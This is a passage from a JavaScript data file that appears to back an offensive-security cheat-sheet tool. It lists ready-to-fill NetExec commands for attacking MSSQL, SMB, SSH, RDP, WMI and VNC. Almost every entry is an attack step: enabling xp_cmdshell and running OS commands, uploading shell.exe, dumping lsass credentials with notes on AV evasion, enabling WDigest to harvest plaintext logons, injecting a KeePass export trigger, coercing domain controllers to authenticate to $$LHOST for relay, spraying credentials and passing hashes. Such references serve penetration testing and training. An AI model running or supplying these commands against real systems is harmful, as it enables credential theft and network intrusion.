            { id: "nxc_m3", label: "SQL query", os: "Linux", command: "nxc mssql $$IP -u $$USER -p $$PASSWORD -q \"SELECT @@version\"", notes: "" },
            { id: "nxc_m4", label: "List databases", os: "Linux", command: "nxc mssql $$IP -u $$USER -p $$PASSWORD -q \"SELECT name FROM sys.databases\"", notes: "" },
            { id: "nxc_m5", label: "Check xp_cmdshell", os: "Linux", command: "nxc mssql $$IP -u $$USER -p $$PASSWORD -q \"SELECT value FROM sys.configurations WHERE name='xp_cmdshell'\"", notes: "1 = already enabled." }
            ]
          },
          {
            id: "nxcm-exp",
            name: "Exploitation",
            commands: [
            { id: "nxc_m6", label: "Enable xp_cmdshell", os: "Linux", command: "nxc mssql $$IP -u $$USER -p $$PASSWORD -q \"EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE\"", notes: "Requires sysadmin." },
            { id: "nxc_m7", label: "OS command via xp_cmdshell", os: "Linux", command: "nxc mssql $$IP -u $$USER -p $$PASSWORD --local-auth -x \"whoami\"", notes: "nxc handles xp_cmdshell automatically with -x." },
            { id: "nxc_m8", label: "Privilege escalation module", os: "Linux", command: "nxc mssql $$IP -u $$USER -p $$PASSWORD -M mssql_priv", notes: "Auto-detects and exploits impersonation and db_owner paths to sysadmin." },
            { id: "nxc_m9", label: "Upload file", os: "Linux", command: "nxc mssql $$IP -u $$USER -p $$PASSWORD --put-file /tmp/shell.exe \"C:\\Windows\\Temp\\shell.exe\"", notes: "Uses OLE Automation or BULK INSERT depending on permissions." }
            ]
          }
        ],
      },
      {
        id: 'nxc-modules',
        name: 'Modules',
        description: 'Post-exploitation modules: credential dumping, AV detection, persistence, coercion.',
        tags: ['windows', 'credentials', 'netexec'],
                subtechniques: [
          {
            id: "nxcmod-dump",
            name: "Credential Dumping",
            commands: [
            { id: "nxc_mod1", label: "List all modules", os: "Linux", command: "nxc smb -L", notes: "Shows all available nxc modules with descriptions." },
            { id: "nxc_mod2", label: "lsassy (lsass dump)", os: "Linux", command: "nxc smb $$IP -u $$USER -p $$PASSWORD -M lsassy", notes: "Dumps plaintext creds + hashes from lsass remotely without touching disk." },
            { id: "nxc_mod3", label: "nanodump", os: "Linux", command: "nxc smb $$IP -u $$USER -p $$PASSWORD -M nanodump", notes: "Stealthy lsass dump using syscalls. Good for AV evasion." },
            { id: "nxc_mod4", label: "procdump", os: "Linux", command: "nxc smb $$IP -u $$USER -p $$PASSWORD -M procdump", notes: "Uses Sysinternals procdump to dump lsass." }
            ]
          },
          {
            id: "nxcmod-pers",
            name: "Persistence & Recon",
            commands: [
            { id: "nxc_mod5", label: "Detect AV / EDR", os: "Linux", command: "nxc smb $$IP -u $$USER -p $$PASSWORD -M enum_av", notes: "Lists running AV, EDR, and security products." },
            { id: "nxc_mod6", label: "Enable WDigest (harvest creds on next login)", os: "Linux", command: "nxc smb $$IP -u $$USER -p $$PASSWORD -M wdigest -o ACTION=enable", notes: "Sets HKLM UseLogonCredential=1 so next logon caches plaintext in lsass." },
            { id: "nxc_mod7", label: "Enable RDP", os: "Linux", command: "nxc smb $$IP -u $$USER -p $$PASSWORD -M rdp -o ACTION=enable", notes: "Enables Remote Desktop via registry." },
            { id: "nxc_mod8", label: "KeePass trigger dump", os: "Linux", command: "nxc smb $$IP -u $$USER -p $$PASSWORD -M keepass_trigger -o KEEPASS_CONFIG_PATH=\"C:\\Users\\$$USER\\AppData\\Roaming\\KeePass\\KeePass.config.xml\"", notes: "Injects export trigger into KeePass config — exports DB in cleartext on next open." },
            { id: "nxc_mod9", label: "MSOL (Azure AD Connect)", os: "Linux", command: "nxc smb $$IP -u $$USER -p $$PASSWORD -M msol", notes: "Extracts Azure AD Connect sync credentials from MSSQL LocalDB." }
            ]
          },
          {
            id: "nxcmod-coerce",
            name: "Coercion & Secrets",
            commands: [
            { id: "nxc_mod10", label: "DFSCoerce (NTLM relay trigger)", os: "Linux", command: "nxc smb $$DC -u $$USER -p $$PASSWORD -M dfscoerce -o LISTENER=$$LHOST", notes: "Coerces DC to authenticate to $$LHOST. Capture with Responder for relay." },
            { id: "nxc_mod11", label: "Printerbug / SpoolSample", os: "Linux", command: "nxc smb $$DC -u $$USER -p $$PASSWORD -M printerbug -o LISTENER=$$LHOST", notes: "MS-RPRN coercion — forces DC to authenticate outbound for relay or unconstrained delegation." },
            { id: "nxc_mod12", label: "Check GPP passwords", os: "Linux", command: "nxc smb $$DC -u $$USER -p $$PASSWORD -M gpp_password", notes: "Retrieves passwords from Group Policy Preferences in SYSVOL." }
            ]
          }
        ],
      },
      {
        id: 'nxc-other-protocols',
        name: 'Other Protocols',
        description: 'SSH, FTP, RDP, WMI, and VNC authentication checks.',
        tags: ['network', 'linux', 'windows', 'netexec'],
                subtechniques: [
          {
            id: "nxcop-ssh",
            name: "SSH",
            commands: [
            { id: "nxc_op1", label: "SSH auth check", os: "Linux", command: "nxc ssh $$IP -u $$USER -p $$PASSWORD", notes: "" },
            { id: "nxc_op2", label: "SSH command exec", os: "Linux", command: "nxc ssh $$IP -u $$USER -p $$PASSWORD -x \"id\"", notes: "" },
            { id: "nxc_op3", label: "SSH spray", os: "Linux", command: "nxc ssh $$IP/24 -u $$USER -p $$PASSWORD --continue-on-success", notes: "Find all hosts in subnet where credentials work." }
            ]
          },
          {
            id: "nxcop-frdp",
            name: "FTP & RDP",
            commands: [
            { id: "nxc_op4", label: "FTP auth check", os: "Linux", command: "nxc ftp $$IP -u $$USER -p $$PASSWORD", notes: "" },
            { id: "nxc_op5", label: "FTP anonymous check", os: "Linux", command: "nxc ftp $$IP -u \"anonymous\" -p \"anonymous\"", notes: "" },
            { id: "nxc_op6", label: "RDP auth check", os: "Linux", command: "nxc rdp $$IP -u $$USER -p $$PASSWORD", notes: "\"Pwn3d!\" = user can RDP in." },
            { id: "nxc_op7", label: "RDP PTH (restricted admin)", os: "Linux", command: "nxc rdp $$IP -u $$USER -H $$HASH", notes: "Requires Restricted Admin Mode enabled on the target." }
            ]
          },
          {
            id: "nxcop-wmi",
            name: "WMI & VNC",
            commands: [
            { id: "nxc_op8", label: "WMI exec", os: "Linux", command: "nxc wmi $$IP -u $$USER -p $$PASSWORD -x \"whoami\"", notes: "Direct WMI execution without SMB share requirement." },
            { id: "nxc_op9", label: "VNC brute", os: "Linux", command: "nxc vnc $$IP -u $$USER -p $$WORDLIST", notes: "" }
            ]
          }
        ],
      },
    ],
  },

];

